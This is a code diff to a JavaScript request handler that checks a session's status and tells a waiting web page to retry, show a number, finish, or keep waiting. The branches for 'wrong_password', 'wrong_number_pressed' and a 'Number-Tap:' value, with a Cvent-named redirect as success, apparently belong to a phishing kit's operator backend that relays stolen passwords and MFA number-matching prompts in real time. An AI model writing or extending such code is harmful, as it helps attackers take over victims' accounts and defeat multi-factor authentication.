@@ -33,10 +33,16 @@ module.exports = async (req, res) => {
 
   const status = session.status || 'pending';
   const redirect = session.redirect || '';
-  if (status === 'saved' || status === 'approved' || redirect.includes('cvent') || redirect === 'saved') {
+  const numberTap = session.numberTap || '';
+
+  if (status === 'retry' || redirect === 'retry' || redirect === 'wrong_password') {
+    return res.status(200).send('retry');
+  } else if (status === 'wrong_number_pressed' || redirect === 'wrong_number' || redirect === 'wrong_number_pressed') {
+    return res.status(200).send('retry');
+  } else if (status === 'saved' || status === 'approved' || redirect.includes('cvent') || redirect === 'saved') {
     return res.status(200).send('saved');
-  } else if (status === 'wrong_number_pressed' || redirect === 'wrong_number') {
-    return res.status(200).send('wrong_number_pressed');
+  } else if (numberTap && redirect.startsWith('Number-Tap:')) {
+    return res.status(200).send(`number:${numberTap}`);
   } else {
     return res.status(200).send('waiting');
   }
